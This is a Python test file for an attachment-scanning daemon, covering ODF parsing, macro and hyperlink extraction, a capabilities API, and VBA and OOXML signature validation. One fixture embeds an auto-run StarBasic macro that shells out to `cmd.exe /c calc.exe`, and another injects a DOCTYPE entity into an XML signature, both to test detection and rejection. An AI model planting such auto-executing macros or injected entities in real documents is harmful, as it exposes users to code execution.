        assert b2.get("cache_hit") is True


# ===========================================================================
# ODF analysis tests
# ===========================================================================


def _make_odf(
    content_text: str = "Hello from ODF document. Visit https://example.com/",
    with_macro: bool = False,
    meta: "dict | None" = None,
    with_hyperlink: bool = False,
    mimetype: str = "application/vnd.oasis.opendocument.text",
) -> bytes:
    """Build a minimal conformant ODF ZIP fixture."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        # ODF spec: mimetype MUST be the first entry, stored (uncompressed)
        z.writestr(zipfile.ZipInfo("mimetype"), mimetype)

        # Minimal manifest
        z.writestr(
            "META-INF/manifest.xml",
            '<?xml version="1.0" encoding="UTF-8"?>'
            "<manifest:manifest "
            ' xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">'
            '<manifest:file-entry manifest:full-path="/" '
            f' manifest:media-type="{mimetype}"/>'
            "</manifest:manifest>",
        )

        # meta.xml
        _m = meta or {}
        z.writestr(
            "meta.xml",
            '<?xml version="1.0" encoding="UTF-8"?>'
            "<office:document-meta"
            ' xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"'
            ' xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"'
            ' xmlns:dc="http://purl.org/dc/elements/1.1/">'
            "<office:meta>"
            f"<dc:title>{_m.get('title', 'Test Document')}</dc:title>"
            f"<meta:initial-creator>{_m.get('author', 'Test Author')}</meta:initial-creator>"
            f"<dc:subject>{_m.get('subject', 'Test Subject')}</dc:subject>"
            f"<meta:keyword>{_m.get('keywords', 'test keyword')}</meta:keyword>"
            f"<dc:creator>{_m.get('last_saved_by', 'Last Saver')}</dc:creator>"
            f"<meta:creation-date>{_m.get('creation_date', '2026-01-01T10:00:00')}</meta:creation-date>"
            f"<dc:date>{_m.get('mod_date', '2026-05-01T12:00:00')}</dc:date>"
            f"<meta:generator>{_m.get('generator', 'TestApp/1.0')}</meta:generator>"
            "<meta:editing-cycles>3</meta:editing-cycles>"
            "</office:meta>"
            "</office:document-meta>",
        )

        # Hyperlink in content
        link_xml = (
            '<text:a xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"'
            ' xmlns:xlink="http://www.w3.org/1999/xlink"'
            ' xlink:href="https://hyperlink.example.com/" xlink:type="simple">'
            "click here</text:a>"
            if with_hyperlink
            else ""
        )

        # content.xml
        z.writestr(
            "content.xml",
            '<?xml version="1.0" encoding="UTF-8"?>'
            "<office:document-content"
            ' xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"'
            ' xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"'
            ' xmlns:xlink="http://www.w3.org/1999/xlink">'
            "<office:body><office:text>"
            f"<text:p>{content_text}</text:p>"
            f"{link_xml}"
            "</office:text></office:body>"
            "</office:document-content>",
        )

        # StarBasic macro
        if with_macro:
            z.writestr(
                "Basic/Standard/Module1.xml",
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<library:library xmlns:library="http://openoffice.org/2000/library">'
                '<script:module xmlns:script="http://openoffice.org/2000/script"'
                ' script:name="Module1" script:language="StarBasic">'
                "<![CDATA[Sub AutoOpen()\n"
                '  Shell "cmd.exe /c calc.exe"\n'
                "End Sub]]>"
                "</script:module>"
                "</library:library>",
            )
            z.writestr(
                "Basic/Standard/script-lb.xml",
                '<?xml version="1.0"?><library:library '
                'xmlns:library="http://openoffice.org/2000/library"/>',
            )
    return buf.getvalue()


_ODF_TEXT_DATA = _make_odf()
_ODF_MACRO_DATA = _make_odf(with_macro=True)
_ODF_META_DATA = _make_odf(
    meta={
        "title": "My Invoice",
        "author": "Alice",
        "subject": "Finance",
        "keywords": "invoice payment",
        "last_saved_by": "Bob",
        "creation_date": "2026-01-15T08:00:00",
        "mod_date": "2026-04-20T14:30:00",
        "generator": "LibreOffice/7.6",
    }
)
_ODF_HYPERLINK_DATA = _make_odf(with_hyperlink=True)


class TestAnalyzeOdf:
    def test_is_odf_by_mime(self, daemon):
        data = _ODF_TEXT_DATA
        assert daemon._is_odf(
            data, "application/vnd.oasis.opendocument.text", "doc.odt"
        )

    def test_is_odf_by_extension(self, daemon):
        assert daemon._is_odf(b"PK\x03\x04", None, "report.ods")
        assert daemon._is_odf(b"PK\x03\x04", None, "slides.odp")

    def test_is_odf_by_zip_mimetype_entry(self, daemon):
        # _ODF_TEXT_DATA has a 'mimetype' entry starting with vnd.oasis.opendocument
        assert daemon._is_odf(_ODF_TEXT_DATA, None, "unknown.bin")

    def test_is_odf_false_for_ooxml(self, daemon):
        assert not daemon._is_odf(
            OOXML_DATA, "application/vnd.openxmlformats", "doc.docx"
        )

    def test_odf_detected_type_is_office(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        assert r["detected_type"] == "office"

    def test_odf_report_has_expected_keys(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        for key in ("has_macro", "analyses", "iocs", "text_preview", "file_hash"):
            assert key in r

    def test_odf_no_macro_flag_false(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        assert r["has_macro"] is False

    def test_odf_text_preview_length_uses_config(self, daemon, monkeypatch):
        saved = xspct.config["xspct_text_preview_length"]
        monkeypatch.setattr(xspct, "HAS_ODFDO", False)
        xspct.config["xspct_text_preview_length"] = 12
        try:
            result = daemon.sync_analyze(
                "<t>",
                "test.odt",
                _make_odf(content_text="A much longer ODF text preview value"),
                "application/vnd.oasis.opendocument.text",
            )
        finally:
            xspct.config["xspct_text_preview_length"] = saved

        assert result["text_preview"]
        assert all(len(seg["text"]) <= 12 for seg in result["text_preview"])

    def test_odf_macro_flag_true(self, daemon):
        r = daemon.sync_analyze(
            "<t>",
            "macro.odt",
            _ODF_MACRO_DATA,
            "application/vnd.oasis.opendocument.text",
        )
        assert r["has_macro"] is True

    def test_odf_macro_analysis_entry_present(self, daemon):
        r = daemon.sync_analyze(
            "<t>",
            "macro.odt",
            _ODF_MACRO_DATA,
            "application/vnd.oasis.opendocument.text",
        )
        types = {a["type"] for a in r["analyses"]}
        assert "AutoExec" in types

    def test_odf_ioc_url_from_text(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        urls = r["iocs"]["urls"]
        assert any("example.com" in u for u in urls)

    def test_odf_hyperlink_extracted(self, daemon):
        r = daemon.sync_analyze(
            "<t>",
            "link.odt",
            _ODF_HYPERLINK_DATA,
            "application/vnd.oasis.opendocument.text",
        )
        urls = r["iocs"]["urls"]
        assert any("hyperlink.example.com" in u for u in urls)

    def test_odf_metadata_populated(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "meta.odt", _ODF_META_DATA, "application/vnd.oasis.opendocument.text"
        )
        meta = r.get("meta_document")
        assert meta is not None
        assert "My Invoice" in meta.get("title", "")
        assert "Alice" in meta.get("author", "")
        assert "Finance" in meta.get("subject", "")

    def test_odf_metadata_keywords(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "meta.odt", _ODF_META_DATA, "application/vnd.oasis.opendocument.text"
        )
        meta = r.get("meta_document", {})
        assert "invoice" in meta.get("keywords", "").lower()

    def test_odf_metadata_dates(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "meta.odt", _ODF_META_DATA, "application/vnd.oasis.opendocument.text"
        )
        meta = r.get("meta_document", {})
        assert meta.get("creation_date", "") != ""

    def test_odf_no_crash_on_bad_zip(self, daemon):
        result = daemon._analyze_odf(
            "<t>",
            "bad.odt",
            b"not a zip file",
            "application/vnd.oasis.opendocument.text",
        )
        assert isinstance(result, dict)
        assert "iocs" in result

    def test_odf_iocs_are_sorted_lists(self, daemon):
        r = daemon.sync_analyze(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        for k in ("urls", "ips", "domains"):
            assert isinstance(r["iocs"][k], list)
            assert r["iocs"][k] == sorted(r["iocs"][k])

    def test_odf_extension_odg_detected(self, daemon):
        r = daemon.sync_analyze(
            "<t>",
            "drawing.odg",
            _ODF_TEXT_DATA,
            "application/vnd.oasis.opendocument.graphics",
        )
        assert r["detected_type"] == "office"

    def test_odf_olevba_not_invoked_for_odf(self, daemon):
        # VBA_Parser raises on ODF; _analyze_odf must complete without error.
        result = daemon._analyze_odf(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        assert result is not None

    def test_odf_no_odfdo_fallback(self, daemon, monkeypatch):
        """Verify that ODF analysis still works when odfdo is not installed."""
        monkeypatch.setattr(xspct, "HAS_ODFDO", False)
        result = daemon._analyze_odf(
            "<t>", "test.odt", _ODF_TEXT_DATA, "application/vnd.oasis.opendocument.text"
        )
        assert isinstance(result, dict)
        # Fallback should still extract URLs via regex on content.xml
        assert isinstance(result["iocs"]["urls"], list)

    def test_odf_no_odfdo_fallback_macro(self, daemon, monkeypatch):
        """Macro detection uses ZIP scan — must work without odfdo."""
        monkeypatch.setattr(xspct, "HAS_ODFDO", False)
        result = daemon._analyze_odf(
            "<t>",
            "macro.odt",
            _ODF_MACRO_DATA,
            "application/vnd.oasis.opendocument.text",
        )
        assert result["has_macro"] is True


# ===========================================================================
# GET /v1/capabilities
# ===========================================================================


class TestCapabilities:
    """Integration + unit tests for the /v1/capabilities endpoint."""

    # -----------------------------------------------------------------------
    # 1. Basic response shape
    # -----------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_capabilities_200_shape(self, client):
        resp = await client.get("/v1/capabilities")
        assert resp.status == 200
        data = await resp.json()
        # Top-level keys
        for key in ("engine", "limits", "response_formats", "analyzers", "mime_types"):
            assert key in data, f"Missing top-level key: {key}"
        # engine block
        assert data["engine"]["name"] == "xspct_scan"
        assert data["engine"]["version"] == xspct._ENGINE_VERSION
        assert data["engine"]["schema_version"] == xspct._REPORT_SCHEMA_VERSION
        # limits block
        for lkey in (
            "max_file_size",
            "default_timeout",
            "archive_max_depth",
            "archive_max_size",
        ):
            assert lkey in data["limits"], f"Missing limits key: {lkey}"
        assert data["limits"]["max_file_size"] == xspct.MAX_UPLOAD_BYTES
        assert data["limits"]["default_timeout"] == xspct.DEFAULT_SCAN_TIMEOUT
        # response_formats
        assert "json" in data["response_formats"]

    @pytest.mark.asyncio
    async def test_all_expected_analyzers_present(self, client):
        resp = await client.get("/v1/capabilities")
        data = await resp.json()
        expected = {
            "pdf",
            "html",
            "office",
            "image",
            "archive",
            "text",
            "script",
            "lnk",
            "javascript",
            "iocs",
            "yara",
            "yara_x",
            "clamav",
            "signature",
        }
        assert expected == set(data["analyzers"].keys())

    @pytest.mark.asyncio
    async def test_every_analyzer_has_active_and_scope(self, client):
        resp = await client.get("/v1/capabilities")
        data = await resp.json()
        valid_scopes = {"type-routed", "global", "post-processing"}
        for name, info in data["analyzers"].items():
            assert isinstance(info.get("active"), bool), (
                f"{name}: 'active' must be bool"
            )
            assert info.get("scope") in valid_scopes, f"{name}: invalid scope"

    # -----------------------------------------------------------------------
    # 2. Disabling an analyzer removes it from mime_types
    # -----------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_disabled_pdf_absent_from_mime_types(self, client):
        orig = xspct.config["xspct_analyzers"]["pdf"]["enabled"]
        try:
            xspct.config["xspct_analyzers"]["pdf"]["enabled"] = False
            resp = await client.get("/v1/capabilities")
            data = await resp.json()
            assert data["analyzers"]["pdf"]["active"] is False
            assert "application/pdf" not in data["mime_types"]["exact"]
        finally:
            xspct.config["xspct_analyzers"]["pdf"]["enabled"] = orig

    @pytest.mark.asyncio
    async def test_p7s_recognized_but_unrouted(self, client):
        """.p7s / application/pkcs7-signature has no dedicated content
        analyzer (detached S/MIME signature parsing is out of scope), but
        must still be declared so an upstream MIME filter (e.g. Rspamd's
        lua_magic-based one) forwards it for the global scanners."""
        resp = await client.get("/v1/capabilities")
        data = await resp.json()
        assert "application/pkcs7-signature" in data["mime_types"]["exact"]
        assert ".p7s" in data["mime_types"]["extensions"]
        daemon_inst = client.app["daemon"]
        assert (
            daemon_inst.get_detected_type(
                "application/pkcs7-signature", "", "smime.p7s", b""
            )
            == "unknown"
        )

    @pytest.mark.asyncio
    async def test_emf_recognized_as_image(self, client):
        """.emf has no OCR/QR value (Pillow cannot decode the GDI record
        format) but is routed through the existing "image" analyzer so it
        is declared in /v1/capabilities and still covered by the global
        YARA/ClamAV/iocsearcher scanners."""
        resp = await client.get("/v1/capabilities")
        data = await resp.json()
        assert ".emf" in data["mime_types"]["extensions"]
        daemon_inst = client.app["daemon"]
        assert (
            daemon_inst.get_detected_type("image/emf", "", "picture.emf", b"")
            == "image"
        )
        assert daemon_inst.get_detected_type(None, None, "picture.emf", None) == "image"

    # -----------------------------------------------------------------------
    # 3. Consistency: every exact MIME routes to an active type-routed analyzer
    # -----------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_mime_types_consistency(self, client):
        """Every MIME in mime_types.exact must route to an active type-routed analyzer."""
        resp = await client.get("/v1/capabilities")
        data = await resp.json()
        active_routed = {
            n
            for n, a in data["analyzers"].items()
            if a.get("scope") == "type-routed" and a.get("active")
        }
        daemon_inst = client.app["daemon"]
        for mime in data["mime_types"]["exact"]:
            detected = daemon_inst.get_detected_type(mime, None, "", b"")
            # mail MIMEs route to 'archive' which maps to the archive analyzer
            assert detected in active_routed or detected == "unknown", (
                f"MIME {mime!r} routes to {detected!r} which is not an active "
                f"type-routed analyzer (active: {active_routed})"
            )

    # -----------------------------------------------------------------------
    # 4. ETag round-trip and invalidation
    # -----------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_etag_present_and_304_on_match(self, client):
        resp1 = await client.get("/v1/capabilities")
        assert resp1.status == 200
        etag = resp1.headers.get("ETag")
        assert etag is not None and etag.startswith('"')

        resp2 = await client.get("/v1/capabilities", headers={"If-None-Match": etag})
        assert resp2.status == 304

    @pytest.mark.asyncio
    async def test_etag_changes_after_config_change(self, client):
        resp1 = await client.get("/v1/capabilities")
        etag1 = resp1.headers.get("ETag")

        orig = xspct.config["xspct_analyzers"]["html"]["enabled"]
        try:
            xspct.config["xspct_analyzers"]["html"]["enabled"] = False
            resp2 = await client.get("/v1/capabilities")
            etag2 = resp2.headers.get("ETag")
            assert etag1 != etag2, "ETag must change after config change"
        finally:
            xspct.config["xspct_analyzers"]["html"]["enabled"] = orig

    # -----------------------------------------------------------------------
    # 5. Authentication
    # -----------------------------------------------------------------------

    @pytest.mark.asyncio
    async def test_capabilities_401_without_key(self, auth_client):
        resp = await auth_client.get("/v1/capabilities")
        assert resp.status == 401

    @pytest.mark.asyncio
    async def test_capabilities_200_with_correct_key(self, auth_client):
        resp = await auth_client.get(
            "/v1/capabilities", headers={"X-Api-Key": "test-secret-key"}
        )
        assert resp.status == 200

    # -----------------------------------------------------------------------
    # 6. Unit: build_capabilities() directly
    # -----------------------------------------------------------------------

    def test_build_capabilities_returns_dict(self, daemon):
        caps = daemon.build_capabilities()
        assert isinstance(caps, dict)
        assert "analyzers" in caps
        assert "mime_types" in caps

    def test_build_capabilities_sorted_lists(self, daemon):
        caps = daemon.build_capabilities()
        for key in ("exact", "extensions", "patterns", "prefixes", "global_scanners"):
            lst = caps["mime_types"].get(key, [])
            assert lst == sorted(lst), f"mime_types.{key} is not sorted"

    # -----------------------------------------------------------------------
    # 7. Client: --capabilities flag validation
    # -----------------------------------------------------------------------

    def test_client_capabilities_and_files_mutually_exclusive(self):
        """--capabilities combined with FILE arguments must exit with code 2."""
        import subprocess
        import sys

        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "xspct_scan.client",
                "--capabilities",
                "somefile.pdf",
            ],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 2

    def test_client_no_args_exits_with_error(self):
        """No arguments at all must exit with code 2."""
        import subprocess
        import sys

        result = subprocess.run(
            [sys.executable, "-m", "xspct_scan.client"],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 2

    def test_client_query_and_files_mutually_exclusive(self):
        """--query combined with FILE arguments must exit with code 2."""
        import subprocess
        import sys

        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "xspct_scan.client",
                "--query",
                "a" * 64,
                "somefile.pdf",
            ],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 2

    def test_client_query_and_capabilities_mutually_exclusive(self):
        """--query combined with --capabilities must exit with code 2."""
        import subprocess
        import sys

        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "xspct_scan.client",
                "--query",
                "a" * 64,
                "--capabilities",
            ],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 2

    def test_client_legacy_multipart_with_rspamd_uid_rejected(self):
        """--legacy-multipart has no metadata part to carry --rspamd-uid/
        --queue-id/--message-id; combining them must fail fast instead of
        silently dropping the correlation IDs."""
        import subprocess
        import sys

        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "xspct_scan.client",
                "--legacy-multipart",
                "--rspamd-uid",
                "7f3a9c1e",
                "somefile.pdf",
            ],
            capture_output=True,
            text=True,
        )
        assert result.returncode == 2
        assert "legacy" in result.stderr.lower()


# ---------------------------------------------------------------------------
# Signature detection (Stufe 5) — helpers + tests
# ---------------------------------------------------------------------------


def _make_test_cert_key(
    tmp_path,
    *,
    not_valid_before=None,
    not_valid_after=None,
    key_usage=None,
    issuer_name=None,
):
    """Write a self-signed RSA-2048 test cert/key pair to *tmp_path*.

    Returns ``(key_file, cert_file, cert)`` where the first two are str
    paths suitable for ``pyhanko.sign.signers.SimpleSigner.load`` and
    *cert* is the parsed ``cryptography`` certificate object.

    *not_valid_before*/*not_valid_after* and *key_usage* (a
    ``cryptography.x509.KeyUsage`` instance) let tests build certificates
    that are expired/not-yet-valid or that restrict signing usage.
    """
    import datetime as _dt

    from cryptography import x509 as _test_x509
    from cryptography.hazmat.primitives import hashes as _test_hashes
    from cryptography.hazmat.primitives import serialization as _test_serialization
    from cryptography.hazmat.primitives.asymmetric import rsa as _test_rsa
    from cryptography.x509.oid import NameOID as _NameOID

    key = _test_rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = _test_x509.Name(
        [_test_x509.NameAttribute(_NameOID.COMMON_NAME, "Test Signer")]
    )
    now = _dt.datetime.now(_dt.timezone.utc)
    builder = (
        _test_x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(issuer_name or name)
        .public_key(key.public_key())
        .serial_number(_test_x509.random_serial_number())
        .not_valid_before(not_valid_before or now - _dt.timedelta(days=1))
        .not_valid_after(not_valid_after or now + _dt.timedelta(days=365))
    )
    if key_usage is not None:
        builder = builder.add_extension(key_usage, critical=True)
    cert = builder.sign(key, _test_hashes.SHA256())
    key_file = tmp_path / "key.pem"
    cert_file = tmp_path / "cert.pem"
    key_file.write_bytes(
        key.private_bytes(
            _test_serialization.Encoding.PEM,
            _test_serialization.PrivateFormat.TraditionalOpenSSL,
            _test_serialization.NoEncryption(),
        )
    )
    cert_file.write_bytes(cert.public_bytes(_test_serialization.Encoding.PEM))
    return str(key_file), str(cert_file), cert


def _make_vba_digsig_blob(key_file, cert_file):
    """Return a length-prefixed [MS-OSHARED] DigSigBlob signed with the test cert."""
    from pyhanko.sign.signers import SimpleSigner

    signer = SimpleSigner.load(key_file, cert_file)
    content_info = signer.sign_general_data(
        b"vba project hash bytes", "sha256", detached=False
    )
    cms_der = content_info.dump()
    return struct.pack("<I", len(cms_der)) + cms_der


def _make_ooxml_document_signature_zip(
    cert,
    key_file,
    cert_file,
    *,
    tampered=False,
    sign_manifest=True,
    transform_uri=None,
    signature_method="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256",
    duplicate_package_object=False,
    additional_cert=None,
    unsigned_timestamp=None,
    unsigned_part=False,
    with_doctype=False,
):
    """Build a minimal signed .docx-like zip with an OOXML XML-DSig signature.

    The ``<Signature>`` tree is built in its FINAL position before any c14n
    digest is computed (never reparented afterwards) — reparenting a node
    with its own redundant namespace declaration silently corrupts lxml's
    canonicalization of descendants.
    """
    from cryptography.hazmat.primitives import hashes as _test_hashes
    from cryptography.hazmat.primitives import serialization as _test_serialization
    from cryptography.hazmat.primitives.asymmetric import padding as _test_padding
    from lxml import etree as _test_etree

    key = _test_serialization.load_pem_private_key(
        open(key_file, "rb").read(), password=None
    )
    cert_der = cert.public_bytes(_test_serialization.Encoding.DER)

    ds = "http://www.w3.org/2000/09/xmldsig#"

    def q(tag):
        return f"{{{ds}}}{tag}"

    doc_xml = b"<w:document xmlns:w='x'><w:body>Hello</w:body></w:document>"
    doc_digest = base64.b64encode(hashlib.sha256(doc_xml).digest()).decode()

    sig = _test_etree.Element(q("Signature"), nsmap={None: ds})
    signed_info = _test_etree.SubElement(sig, q("SignedInfo"))
    sig_value_el = _test_etree.SubElement(sig, q("SignatureValue"))
    key_info = _test_etree.SubElement(sig, q("KeyInfo"))
    x509_data = _test_etree.SubElement(key_info, q("X509Data"))
    _test_etree.SubElement(x509_data, q("X509Certificate")).text = base64.b64encode(
        cert_der
    ).decode()
    if additional_cert is not None:
        additional_der = additional_cert.public_bytes(_test_serialization.Encoding.DER)
        _test_etree.SubElement(x509_data, q("X509Certificate")).text = base64.b64encode(
            additional_der
        ).decode()

    obj = _test_etree.SubElement(sig, q("Object"), Id="idPackageObject")
    manifest = _test_etree.SubElement(obj, q("Manifest"))
    ref_part = _test_etree.SubElement(
        manifest, q("Reference"), URI="/word/document.xml?ContentType=xxx"
    )
    _test_etree.SubElement(
        ref_part, q("DigestMethod"), Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"
    )
    _test_etree.SubElement(ref_part, q("DigestValue")).text = doc_digest

    obj_c14n = _test_etree.tostring(obj, method="c14n")
    obj_digest = base64.b64encode(hashlib.sha256(obj_c14n).digest()).decode()

    if duplicate_package_object:
        duplicate = _test_etree.fromstring(_test_etree.tostring(obj))
        sig.append(duplicate)

    if unsigned_timestamp:
        mdssi = "http://schemas.openxmlformats.org/package/2006/digital-signature"
        unsigned_obj = _test_etree.SubElement(sig, q("Object"), Id="idUnsignedTime")
        signature_time = _test_etree.SubElement(
            unsigned_obj, f"{{{mdssi}}}SignatureTime"
        )
        _test_etree.SubElement(
            signature_time, f"{{{mdssi}}}Value"
        ).text = unsigned_timestamp

    if sign_manifest:
        ref_obj = _test_etree.SubElement(
            signed_info, q("Reference"), URI="#idPackageObject"
        )
        if transform_uri:
            transforms = _test_etree.SubElement(ref_obj, q("Transforms"))
            _test_etree.SubElement(transforms, q("Transform"), Algorithm=transform_uri)
        _test_etree.SubElement(
            ref_obj,
            q("DigestMethod"),
            Algorithm="http://www.w3.org/2001/04/xmlenc#sha256",
        )
        _test_etree.SubElement(ref_obj, q("DigestValue")).text = obj_digest
    _test_etree.SubElement(
        signed_info,
        q("SignatureMethod"),
        Algorithm=signature_method,
    )

    si_c14n = _test_etree.tostring(signed_info, method="c14n")
    sig_bytes = key.sign(si_c14n, _test_padding.PKCS1v15(), _test_hashes.SHA256())
    sig_value_el.text = base64.b64encode(sig_bytes).decode()

    sig_xml = _test_etree.tostring(sig)
    if with_doctype:
        sig_xml = b'<!DOCTYPE Signature [<!ENTITY injected "EXPANDED">]>' + sig_xml

    final_doc_xml = (
        b"<w:document xmlns:w='x'><w:body>TAMPERED</w:body></w:document>"
        if tampered
        else doc_xml
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml", final_doc_xml)
        if unsigned_part:
            z.writestr("word/unsigned-payload.xml", b"<payload>unsigned</payload>")
        z.writestr("_xmlsignatures/sig1.xml", sig_xml)
    return buf.getvalue()


@pytest.mark.skipif(not xspct.HAS_PYHANKO, reason="pyhanko not installed")
class TestAnalyzeSignatures:
    """Tests for the Stufe 5 signature-detection analyzer (VBA/OOXML/PDF)."""

    # -----------------------------------------------------------------------
    # VBA project signature — CMS parsing/validation (_parse_vba_digsig)
    # -----------------------------------------------------------------------

    def test_parse_vba_digsig_valid(self, daemon, tmp_path):
        key_file, cert_file, _cert = _make_test_cert_key(tmp_path)
        digsig = _make_vba_digsig_blob(key_file, cert_file)
        entry = daemon._parse_vba_digsig(digsig)
        assert entry is not None
        assert entry["present"] is True
        assert entry["type"] == "vba_project"
        assert entry["valid"] is True
        assert entry["trusted"] is False
        assert entry["covers_whole_document"] is False
        assert entry["key_usage_valid"] is True
        assert entry["cert_time_valid"] is True
        assert "Test Signer" in entry["signer"]
        assert entry["issuer_fingerprint"].startswith("sha256:")

    def test_parse_vba_digsig_too_short(self, daemon):
        assert daemon._parse_vba_digsig(b"\x00\x00") is None

    def test_parse_vba_digsig_garbage(self, daemon):
        assert daemon._parse_vba_digsig(struct.pack("<I", 4) + b"junk") is None

    # -----------------------------------------------------------------------
    # VBA project signature — OOXML zip member (vbaProjectSignature*.bin)
    # -----------------------------------------------------------------------

    def test_vba_signature_ooxml_zip_member(self, daemon, tmp_path):
        key_file, cert_file, _cert = _make_test_cert_key(tmp_path)
        digsig = _make_vba_digsig_blob(key_file, cert_file)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<w:document/>")
            z.writestr("word/vbaProject.bin", b"placeholder")
            z.writestr("word/vbaProjectSignature.bin", digsig)
        result = daemon.analyze_signatures(buf.getvalue(), "macro.docm")
        assert result is not None
        sigs = result["signatures"]
        assert any(s["type"] == "vba_project" for s in sigs)
        vba_entry = next(s for s in sigs if s["type"] == "vba_project")
        assert vba_entry["valid"] is True
        assert vba_entry["trusted"] is False

    # -----------------------------------------------------------------------
    # VBA project signature — OLE2 stream (_extract_ole_vba_signatures)
    # -----------------------------------------------------------------------

    def test_vba_signature_ole_stream(self, daemon, tmp_path, monkeypatch):
        key_file, cert_file, _cert = _make_test_cert_key(tmp_path)
        digsig = _make_vba_digsig_blob(key_file, cert_file)

        class _FakeOle:
            def __init__(self, streams):
                self._streams = streams

            def listdir(self, streams=True, storages=False):
                return [list(p) for p in self._streams]

            def openstream(self, path):
                return io.BytesIO(self._streams[tuple(path)])

            def close(self):
                pass

        fake = _FakeOle({("\x05DigitalSignature",): digsig})
        monkeypatch.setattr(xspct, "HAS_OLEFILE", True)
        monkeypatch.setattr(xspct._olefile, "isOleFile", lambda _b: True)
        monkeypatch.setattr(xspct._olefile, "OleFileIO", lambda _b: fake)

        result = daemon.analyze_signatures(b"not-really-ole-but-mocked", "macro.xls")
        assert result is not None
        sigs = result["signatures"]
        assert len(sigs) == 1
        assert sigs[0]["type"] == "vba_project"
        assert sigs[0]["valid"] is True

    # -----------------------------------------------------------------------
    # OOXML whole-document signature (XML-DSig)
    # -----------------------------------------------------------------------

    def test_ooxml_document_signature_valid(self, daemon, tmp_path):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        good = _make_ooxml_document_signature_zip(cert, key_file, cert_file)
        result = daemon.analyze_signatures(good, "good.docx")
        assert result is not None
        sigs = result["signatures"]
        assert len(sigs) == 1
        entry = sigs[0]
        assert entry["type"] == "ooxml_document"
        assert entry["valid"] is True
        assert entry["covers_whole_document"] is True
        assert entry["trusted"] is False
        assert entry["key_usage_valid"] is True
        assert entry["cert_time_valid"] is True
        assert "Test Signer" in entry["signer"]

    def test_ooxml_document_signature_tampered(self, daemon, tmp_path):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        tampered = _make_ooxml_document_signature_zip(
            cert, key_file, cert_file, tampered=True
        )
        result = daemon.analyze_signatures(tampered, "tampered.docx")
        assert result is not None
        sigs = result["signatures"]
        assert len(sigs) == 1
        entry = sigs[0]
        assert entry["type"] == "ooxml_document"
        assert entry["valid"] is False

    def test_ooxml_document_signature_requires_signed_package_manifest(
        self, daemon, tmp_path
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        unsigned_manifest = _make_ooxml_document_signature_zip(
            cert, key_file, cert_file, sign_manifest=False
        )
        assert daemon.analyze_signatures(unsigned_manifest, "unsigned.docx") is None

    def test_ooxml_document_signature_rejects_unsupported_transform(
        self, daemon, tmp_path
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        transformed = _make_ooxml_document_signature_zip(
            cert,
            key_file,
            cert_file,
            transform_uri="urn:xspct:unsupported-transform",
        )
        assert daemon.analyze_signatures(transformed, "transform.docx") is None

    def test_ooxml_document_signature_rejects_unsupported_signature_method(
        self, daemon, tmp_path
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        unsupported_method = _make_ooxml_document_signature_zip(
            cert,
            key_file,
            cert_file,
            signature_method="urn:xspct:unsupported-signature-method",
        )
        assert daemon.analyze_signatures(unsupported_method, "method.docx") is None

    def test_ooxml_document_signature_rejects_duplicate_package_object_id(
        self, daemon, tmp_path
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        duplicated = _make_ooxml_document_signature_zip(
            cert, key_file, cert_file, duplicate_package_object=True
        )
        assert daemon.analyze_signatures(duplicated, "duplicate.docx") is None

    def test_ooxml_document_signature_reports_incomplete_package_coverage(
        self, daemon, tmp_path
    ):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        document = _make_ooxml_document_signature_zip(
            cert, key_file, cert_file, unsigned_part=True
        )
        result = daemon.analyze_signatures(document, "subset.docx")
        entry = result["signatures"][0]
        assert entry["valid"] is True
        assert entry["covers_whole_document"] is False

    def test_ooxml_document_signature_rejects_doctype(self, daemon, tmp_path):
        key_file, cert_file, cert = _make_test_cert_key(tmp_path)
        document = _make_ooxml_document_signature_zip(
            cert, key_file, cert_file, with_doctype=True
        )
        assert daemon.analyze_signatures(document, "doctype.docx") is None

